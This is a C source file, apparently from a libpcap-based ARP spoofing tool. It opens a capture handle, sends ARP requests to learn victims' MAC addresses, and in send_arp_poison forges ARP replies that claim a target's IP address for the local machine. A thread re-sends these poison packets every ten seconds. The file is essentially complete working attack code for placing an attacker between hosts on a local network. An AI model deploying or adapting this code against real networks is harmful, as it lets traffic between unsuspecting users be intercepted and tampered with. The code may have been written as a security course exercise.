#include "use_pcap.h"

/*
 * Prototype : int init_handle(pcap_arg *arg)
 * Last Modified 2017/07/30
 * Written by pr0gr4m
 *
 * open pcap handle and store to arg
 * open argument of to_ms is 0
 */
int init_handle(pcap_arg *arg, char *dev)
{
    char errbuf[PCAP_ERRBUF_SIZE];

    if (dev == NULL)
    {
        pr_err("Couldn't find default device: %s\n", errbuf);
        return RET_ERR;
    }

    /*
    if (pcap_lookupnet(dev, &(arg->net), &(arg->mask), errbuf) == -1)
    {
        pr_err("Couldn't get netmask for device %s: %s\n", "dum0", errbuf);
        arg->net = 0;
        arg->mask = 0;
    }
    */

    arg->net = 0;
    arg->mask = 0;

    // recv(read) timeout 1 sec
    arg->handle = pcap_open_live(dev, BUFSIZ, 1, 100, errbuf);
    if (arg->handle == NULL)
    {
        pr_err("Couldn't open device %s: %s \n", dev, errbuf);
        return RET_ERR;
    }

    return RET_SUC;
}

/*
 * Prototype : int set_handle_arp(pcap_arg *arg)
 * Last Modified 2017/07/29
 * Written by pr0gr4m
 *
 * set filter of arp to handle
 */
int set_handle_arp(pcap_arg *arg)
{
    struct bpf_program filter;
    const char exp[] = "arp || icmp";

    if (pcap_compile(arg->handle, &filter, exp, 1, arg->net) == -1)
    {
        pr_err("Couldn't parse filter '%s': %s", exp, pcap_geterr(arg->handle));
        return RET_ERR;
    }

    if (pcap_setfilter(arg->handle, &filter) == -1)
    {
        pr_err("Couldn't install filter '%s': %s", exp, pcap_geterr(arg->handle));
        return RET_ERR;
    }

    return RET_SUC;
}

/*
 * Prototype : int close_handle(pcap_arg *arg)
 * Last Modified 2017/07/12
 * Written by pr0gr4m
 *
 * close the handle
 */
int close_handle(pcap_arg *arg)
{
    pcap_close(arg->handle);
    return RET_SUC;
}

/*
 * Prototype : int send_arp_packet(pcap_arg *arg)
 * Last Modified 2017/07/29
 * Written by pr0gr4m
 *
 * print and send arp frame
 */
int send_arp_packet(pcap_arg *arg, struct ether_header *ehdr, struct arp_header *ahdr)
{
    u_char frame[ETH_HEADER_LEN + ARP_HEADER_LEN];
    build_ether(frame, ehdr);
    build_arp(frame + ETH_HEADER_LEN, ahdr);

    pr_out("send packet:");
    dumpcode(frame, sizeof(frame));
    putchar('\n');
    if (pcap_sendpacket(arg->handle, frame, sizeof(frame)) == -1)
    {
        pr_err("pcap_sendpacket: %s", pcap_geterr(arg->handle));
        return RET_ERR;
    }

    return RET_SUC;
}

/*
 * Prototype : int send_arp_request(pcap_arg *arg, char *addr_s)
 * Last Modified 2017/07/30
 * Written by pr0gr4m
 *
 * send arp request packet
 *
 * dhost : ff ff ff ff ff ff
 * shost : local MAC Address
 * etype : ARP
 *
 * opcode : request
 * sender hw addr : local MAC Address
 * sender pt addr : local IP Address
 * target hw addr : 00 00 00 00 00 00
 * target pt addr : addr_s
 *
 * return RET_SUC when succeed to send
 * return RET_ERR when fail to send
 */
int send_arp_request(pcap_arg *arg, char *_addr, int flag)
{
    struct ether_header ehdr;
    struct arp_header ahdr;
    struct in_addr addr;

    memset(ehdr.ether_dhost, 0xff, HWADDR_LEN);
    memcpy(ehdr.ether_shost, arg->local_mac, HWADDR_LEN);
    ehdr.ether_type = htons(ETHERTYPE_ARP);

    ahdr.op = htons(ARP_REQUEST);
    memcpy(ahdr.sha, arg->local_mac, HWADDR_LEN);
    memcpy(ahdr.spa, &(arg->local_ip), PTADDR_LEN);
    memset(ahdr.tha, 0x00, HWADDR_LEN);
    inet_pton(AF_INET, _addr, &addr);
    memcpy(ahdr.tpa, &addr, PTADDR_LEN);

    if (flag == SENDER)
    {
        memcpy(&(arg->sender_ip), &addr, sizeof(struct in_addr));
    }
    else if (flag == TARGET)
    {
        memcpy(&(arg->target_ip), &addr, sizeof(struct in_addr));
    }

    if (send_arp_packet(arg, &ehdr, &ahdr))
    {
        return RET_ERR;
    }
    return RET_SUC;
}

/*
 * Prototype : int send_arp_poison(pcap_arg *arg, struct arp_header *ahdr, char *addr_t)
 * Last Modified 2017/07/30
 * Written by pr0gr4m
 *
 * send arp poison reply packet
 * core of arp spoofing
 *
 * argument ahdr store victim's arp reply
 * local variable phdr is poison arp header
 *
 * dhost : sender(victim) MAC Address
 * shost : local MAC Address
 * etype : ARP
 *
 * opcode : reply
 * sender hw addr : local MAC Address
 * sender pt addr : addr_t (target ip address)
 * target hw addr : sender(victim) MAC Address
 * target pt addr : sender(victim) ip address
 *
 * return RET_SUC when succeed to send
 * return RET_ERR when fail to send
 */
int send_arp_poison(pcap_arg *arg, struct arp_header *ahdr, char *addr_t)
{
    struct ether_header ehdr;
    struct arp_header phdr;
    struct in_addr addr;

    memcpy(ehdr.ether_dhost, ahdr->sha, HWADDR_LEN);
    memcpy(ehdr.ether_shost, arg->local_mac, HWADDR_LEN);
    ehdr.ether_type = htons(ETHERTYPE_ARP);

    phdr.op = htons(ARP_REPLY);
    memcpy(phdr.sha, arg->local_mac, HWADDR_LEN);
    inet_pton(AF_INET, addr_t, &addr);
    memcpy(phdr.spa, &addr, PTADDR_LEN);
    memcpy(phdr.tha, ahdr->sha, HWADDR_LEN);
    memcpy(phdr.tpa, ahdr->spa, PTADDR_LEN);

    if (send_arp_packet(arg, &ehdr, &phdr))
    {
        return RET_ERR;
    }
    return RET_SUC;
}

/*
 * Prototype : int recv_arp_packet(pcap_arg *arg)
 * Last Modified 2017/07/30
 * Written by pr0gr4m
 *
 * print and recv arp frame
 * store arp header to argument ahdr
 * return RET_SUC when ethernet type is ARP
 * return RET_ERR when ehternet type is not ARP
 */
int recv_arp_packet(pcap_arg *arg, struct arp_header *ahdr, int flag)
{
    struct pcap_pkthdr *header;
    const u_char *frame, *packet;
    int ret_next;
    int i;

    for (i = 0; i < RECV_ITER_N; i++)
    {
        ret_next = pcap_next_ex(arg->handle, &header, &frame);

        if (ret_next == 0)
        {       // timeout
            pr_err("pcap_next_ex: timeout");
            continue;
        }

        if (ret_next != 1)
        {       // error
            pr_err("pcap_next_ex: %s", pcap_geterr(arg->handle));
            return RET_ERR;
        }

        if (frame == NULL)
        {
            pr_err("Don't grab the packet");
            continue;
        }

        if (parse_ethernet(frame) == ETHERTYPE_ARP)
        {       // frame is arp
            memset(ahdr, 0, sizeof(struct arp_header));
            pr_out("recv packet:");
            dumpcode(frame, header->len);
            putchar('\n');
            packet = frame + ETH_HEADER_LEN;
            parse_arp(packet, ahdr);

            if (flag == SENDER && !memcmp(&(ahdr->spa), &(arg->sender_ip), sizeof(struct in_addr)))
            {   // succeed to match sender
                return RET_SUC;
            }
            else if (flag == TARGET && !memcmp(&(ahdr->spa), &(arg->target_ip), sizeof(struct in_addr)))
            {   // succeed to match target
                return RET_SUC;
            }
            else
            {
                pr_out("recv unwanted reply packet");
                puts("==========================================================\n");
                continue;
            }
        }
        else
        {       // frame is not arp
            pr_err("recv: arp filter has problem");
            return RET_ERR;
        }
    }

    if (flag == SENDER)
    {
        pr_err("recv: couldn't find sender");
    }
    else
    {
        pr_err("recv: couldn't find target");
    }

    return RET_ERR;
}

/*
 * Prototype : void *thread_arp_poison(void *arg)
 * Last Modified 2017/08/06
 * Written by pr0gr4m
 *
 * Arp Infection Thread
 * Send Arp Poisoning Packet periodically
 */
void *thread_arp_poison(void *arg)
{
    struct thread_arg_arp *t_arg = (struct thread_arg_arp *)arg;

    while (TRUE)
    {
        if (send_arp_poison(t_arg->p_arg, t_arg->arp_hdr, t_arg->target))
        {
            pr_err("Fail: send_arp_poison");
            exit(EXIT_FAILURE);
        }

        sleep(10);
    }

    return NULL;
}
